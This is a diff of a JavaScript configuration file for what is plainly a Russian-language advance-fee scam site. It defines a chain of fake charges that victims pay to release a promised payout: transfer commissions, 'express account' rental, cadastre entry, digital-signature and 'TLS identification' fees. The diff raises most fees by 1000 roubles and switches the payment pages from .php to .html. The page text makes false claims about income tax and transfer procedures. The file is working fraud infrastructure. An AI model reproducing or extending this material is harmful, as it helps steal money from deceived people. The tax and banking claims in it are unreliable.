@@ -5398,22 +5398,22 @@
                 },
                 product: "Комиссия, запрашиваемая за перевод составляет",
                 amount: {
-                    e: 1300,
-                    c: 1300,
-                    b: 1300,
-                    p: 1300,
-                    h: 1300
+                    e: 2300,
+                    c: 2300,
+                    b: 2300,
+                    p: 2300,
+                    h: 2300
                 },
                 customItem: "",
                 instructions: ["Гарантируем Вам быструю выплату", "Оплатите комиссии за перевод", "Получите вашу выплату в течении 10 минут"],
                 buttonText: "Оплатить комиссию",
                 paymentLink: "/account/comissionfp?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48545.php",
-                    c: window.location.origin + o + "pay48545.php",
-                    b: window.location.origin + o + "pay48545.php",
-                    p: window.location.origin + o + "pay48545.php",
-                    h: window.location.origin + o + "pay48545.php"
+                    e: window.location.origin + o + "pay48545.html",
+                    c: window.location.origin + o + "pay48545.html",
+                    b: window.location.origin + o + "pay48545.html",
+                    p: window.location.origin + o + "pay48545.html",
+                    h: window.location.origin + o + "pay48545.html"
                 }
             },
             error3405: {
@@ -5522,22 +5522,22 @@
                 description: ['Первая часть перевода на сумму <b class="text-numbers">{{firstPart}}</b> отмечена как оплаченная', "Первый перевод не может быть отправлен, пока не будет оплачена комиссия за второй перевод!", "Как только Вы совершите оплату комиссии за второй перевод, оба перевода будут <b>отправлены</b> на указанные Вами реквизиты"],
                 product: 'Поскольку выплата разделена на две равные части, то второй перевод составит <span class="text-numbers font-weight-bold">{{secondPart}}</span>, комиссия за него <span class="text-numbers">(0,1% + 50 руб.)</span>, т.е.',
                 amount: {
-                    e: 1350,
-                    c: 1350,
-                    b: 1350,
-                    p: 1350,
-                    h: 1350
+                    e: 2350,
+                    c: 2350,
+                    b: 2350,
+                    p: 2350,
+                    h: 2350
                 },
                 customItem: "",
                 instructions: ["Гарантируем быстрый перевод", "Оплатите комиссию за второй перевод", "Получите вашу выплату целиком"],
                 buttonText: "Оплатить комиссию за второй перевод",
                 paymentLink: "/account/comissionsp?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48546.php",
-                    c: window.location.origin + o + "pay48546.php",
-                    b: window.location.origin + o + "pay48546.php",
-                    p: window.location.origin + o + "pay48546.php",
-                    h: window.location.origin + o + "pay48546.php"
+                    e: window.location.origin + o + "pay48546.html",
+                    c: window.location.origin + o + "pay48546.html",
+                    b: window.location.origin + o + "pay48546.html",
+                    p: window.location.origin + o + "pay48546.html",
+                    h: window.location.origin + o + "pay48546.html"
                 }
             },
             express: {
@@ -5564,22 +5564,22 @@
                 description: ['Общие положения: Регистрация интеренет-прибыли в налоговом органе обязует получателя(Вас) оплатить НДФЛ(налог на доход физических лиц) в сумме 20% от общей прибыли. При этом, если прибыль не превышает <span class="text-numbers">{{geoMoney10Percent}}</span>., гражданин освобождается от уплаты налога.Чтобы отправить Вам перевод <span class="text-numbers">{{moneyPageBased}}</span> и не платить налог на доход физических лиц необходимо, чтобы средства Вы получили как экспресс перевод. В таком случае налог с них <b>не взимается</b>. Это предусмотрено законом и позволит Вам сохранить значительную часть денег.', "Чтобы воспользоваться такой услугой необходимо оплатить <b>аренду</b> надежного экспресс счета."],
                 product: "После аренды экспресс счета, средства будут переведены на указанные ранее реквизиты. Стоимость аренды экспресс счета на 1 день составляет",
                 amount: {
-                    e: 1880,
-                    c: 1880,
-                    b: 1880,
-                    p: 1880,
-                    h: 1880
+                    e: 2880,
+                    c: 2880,
+                    b: 2880,
+                    p: 2880,
+                    h: 2880
                 },
                 customItem: "",
                 instructions: ["Оплатите аренду экспресс счета", "Вывод будет совершен моментально", "Получите ваши средства"],
                 buttonText: "Оплатить аренду",
                 paymentLink: "/account/express?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48547.php",
-                    c: window.location.origin + o + "pay48547.php",
-                    b: window.location.origin + o + "pay48547.php",
-                    p: window.location.origin + o + "pay48547.php",
-                    h: window.location.origin + o + "pay48547.php"
+                    e: window.location.origin + o + "pay48547.html",
+                    c: window.location.origin + o + "pay48547.html",
+                    b: window.location.origin + o + "pay48547.html",
+                    p: window.location.origin + o + "pay48547.html",
+                    h: window.location.origin + o + "pay48547.html"
                 }
             },
             cadastr: {
@@ -5593,22 +5593,22 @@
                 upsellType: "text",
                 product: "Стоимость внесения в кадастр всего",
                 amount: {
-                    e: 1260,
-                    c: 1260,
-                    b: 1260,
-                    p: 1260,
-                    h: 1260
+                    e: 2260,
+                    c: 2260,
+                    b: 2260,
+                    p: 2260,
+                    h: 2260
                 },
                 customItem: "",
                 instructions: ["Оплатите перевод в кадастр", "Деньги придут на указанный ранее счет моментально"],
                 buttonText: "Внести в кадастр",
                 paymentLink: "/account/cadastr?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48548.php",
-                    c: window.location.origin + o + "pay48548.php",
-                    b: window.location.origin + o + "pay48548.php",
-                    p: window.location.origin + o + "pay48548.php",
-                    h: window.location.origin + o + "pay48548.php"
+                    e: window.location.origin + o + "pay48548.html",
+                    c: window.location.origin + o + "pay48548.html",
+                    b: window.location.origin + o + "pay48548.html",
+                    p: window.location.origin + o + "pay48548.html",
+                    h: window.location.origin + o + "pay48548.html"
                 }
             },
             transitbooking: {
@@ -5622,22 +5622,22 @@
                 upsellType: "text",
                 product: "Стоимость брони всего",
                 amount: {
-                    e: 1480,
-                    c: 1480,
-                    b: 1480,
-                    p: 1480,
-                    h: 1480
+                    e: 2480,
+                    c: 2480,
+                    b: 2480,
+                    p: 2480,
+                    h: 2480
                 },
                 customItem: "",
                 instructions: ["Оплатите бронь", "Получите средства на указанные реквизиты"],
                 buttonText: "Оплатить бронь",
                 paymentLink: "/account/transitbooking?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48549.php",
-                    c: window.location.origin + o + "pay48549.php",
-                    b: window.location.origin + o + "pay48549.php",
-                    p: window.location.origin + o + "pay48549.php",
-                    h: window.location.origin + o + "pay48549.php"
+                    e: window.location.origin + o + "pay48549.html",
+                    c: window.location.origin + o + "pay48549.html",
+                    b: window.location.origin + o + "pay48549.html",
+                    p: window.location.origin + o + "pay48549.html",
+                    h: window.location.origin + o + "pay48549.html"
                 }
             },
             transitactivation: {
@@ -5651,22 +5651,22 @@
                 upsellType: "text",
                 product: "Стоимость активации транзитной экспресс ячейки всего",
                 amount: {
-                    e: 1980,
-                    c: 1980,
-                    b: 1980,
-                    p: 1980,
-                    h: 1980
+                    e: 2980,
+                    c: 2980,
+                    b: 2980,
+                    p: 2980,
+                    h: 2980
                 },
                 customItem: "",
                 instructions: ["Оплатите активацию транзитной ячейки", "Система автоматический активирует ячейку", "Ваша выплата будет отправлена на ваши реквизиты"],
                 buttonText: "Активировать",
                 paymentLink: "/account/transitactivation?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48550.php",
-                    c: window.location.origin + o + "pay48550.php",
-                    b: window.location.origin + o + "pay48550.php",
-                    p: window.location.origin + o + "pay48550.php",
-                    h: window.location.origin + o + "pay48550.php"
+                    e: window.location.origin + o + "pay48550.html",
+                    c: window.location.origin + o + "pay48550.html",
+                    b: window.location.origin + o + "pay48550.html",
+                    p: window.location.origin + o + "pay48550.html",
+                    h: window.location.origin + o + "pay48550.html"
                 }
             },
             signature: {
@@ -5680,22 +5680,22 @@
                 upsellType: "text",
                 product: "Стоимость услуг по генерации цифровой подписи всего",
                 amount: {
-                    e: 2220,
-                    c: 2220,
-                    b: 2220,
-                    p: 2220,
-                    h: 2220
+                    e: 2520,
+                    c: 2520,
+                    b: 2520,
+                    p: 2520,
+                    h: 2520
                 },
                 customItem: "",
                 instructions: ["Оплатите услуги генерации подписи", "С помощью подписи система автоматически выведет Ваш платеж", "Получите Вашу выплату"],
                 buttonText: "Оплатить услуги",
                 paymentLink: "/account/signature?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48551.php",
-                    c: window.location.origin + o + "pay48551.php",
-                    b: window.location.origin + o + "pay48551.php",
-                    p: window.location.origin + o + "pay48551.php",
-                    h: window.location.origin + o + "pay48551.php"
+                    e: window.location.origin + o + "pay48551.html",
+                    c: window.location.origin + o + "pay48551.html",
+                    b: window.location.origin + o + "pay48551.html",
+                    p: window.location.origin + o + "pay48551.html",
+                    h: window.location.origin + o + "pay48551.html"
                 }
             },
             signatureverify: {
@@ -5709,22 +5709,22 @@
                 upsellType: "text",
                 product: "Пополните сумму перевода на",
                 amount: {
-                    e: 1640,
-                    c: 1640,
-                    b: 1640,
-                    p: 1640,
-                    h: 1640
+                    e: 2640,
+                    c: 2640,
+                    b: 2640,
+                    p: 2640,
+                    h: 2640
                 },
                 customItem: "",
                 instructions: ["Пополните свой баланс на указанную сумму", "Система автоматически проверит вашу подпись", "Ваша выплата будет отправлена на ваши реквизиты"],
                 buttonText: "Пополнить баланс",
                 paymentLink: "/account/signatureverify?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48552.php",
-                    c: window.location.origin + o + "pay48552.php",
-                    b: window.location.origin + o + "pay48552.php",
-                    p: window.location.origin + o + "pay48552.php",
-                    h: window.location.origin + o + "pay48552.php"
+                    e: window.location.origin + o + "pay48552.html",
+                    c: window.location.origin + o + "pay48552.html",
+                    b: window.location.origin + o + "pay48552.html",
+                    p: window.location.origin + o + "pay48552.html",
+                    h: window.location.origin + o + "pay48552.html"
                 }
             },
             tls: {
@@ -5738,22 +5738,22 @@
                 upsellType: "text",
                 product: "Пополните сумму перевода на",
                 amount: {
-                    e: 2000,
-                    c: 2000,
-                    b: 2000,
-                    p: 2000,
-                    h: 2000
+                    e: 3000,
+                    c: 3000,
+                    b: 3000,
+                    p: 3000,
+                    h: 3000
                 },
                 customItem: "",
                 instructions: ["Пополните свой баланс на указанную сумму", "Система автоматически идентифицирует протокол TLS в вашем браузере", "Получите вашу выплату"],
                 buttonText: "Пополнить баланс",
                 paymentLink: "/account/tls?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48553.php",
-                    c: window.location.origin + o + "pay48553.php",
-                    b: window.location.origin + o + "pay48553.php",
-                    p: window.location.origin + o + "pay48553.php",
-                    h: window.location.origin + o + "pay48553.php"
+                    e: window.location.origin + o + "pay48553.html",
+                    c: window.location.origin + o + "pay48553.html",
+                    b: window.location.origin + o + "pay48553.html",
+                    p: window.location.origin + o + "pay48553.html",
+                    h: window.location.origin + o + "pay48553.html"
                 }
             },
             manual: {
@@ -5778,11 +5778,11 @@
                 buttonText: "Нанять менеджера",
                 paymentLink: "/account/manual?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48554.php",
-                    c: window.location.origin + o + "pay48554.php",
-                    b: window.location.origin + o + "pay48554.php",
-                    p: window.location.origin + o + "pay48554.php",
-                    h: window.location.origin + o + "pay48554.php"
+                    e: window.location.origin + o + "pay48554.html",
+                    c: window.location.origin + o + "pay48554.html",
+                    b: window.location.origin + o + "pay48554.html",
+                    p: window.location.origin + o + "pay48554.html",
+                    h: window.location.origin + o + "pay48554.html"
                 }
             },
             limitex: {
@@ -5807,11 +5807,11 @@
                 buttonText: "Подключить тариф",
                 paymentLink: "/account/limitex?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48555.php",
-                    c: window.location.origin + o + "pay48555.php",
-                    b: window.location.origin + o + "pay48555.php",
-                    p: window.location.origin + o + "pay48555.php",
-                    h: window.location.origin + o + "pay48555.php"
+                    e: window.location.origin + o + "pay48555.html",
+                    c: window.location.origin + o + "pay48555.html",
+                    b: window.location.origin + o + "pay48555.html",
+                    p: window.location.origin + o + "pay48555.html",
+                    h: window.location.origin + o + "pay48555.html"
                 }
             },
             momentum: {
@@ -5836,11 +5836,11 @@
                 buttonText: "Вывести деньги",
                 paymentLink: "/account/momentum?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "pay48556.php",
-                    c: window.location.origin + o + "pay48556.php",
-                    b: window.location.origin + o + "pay48556.php",
-                    p: window.location.origin + o + "pay48556.php",
-                    h: window.location.origin + o + "pay48556.php"
+                    e: window.location.origin + o + "pay48556.html",
+                    c: window.location.origin + o + "pay48556.html",
+                    b: window.location.origin + o + "pay48556.html",
+                    p: window.location.origin + o + "pay48556.html",
+                    h: window.location.origin + o + "pay48556.html"
                 }
             },
             fin: {
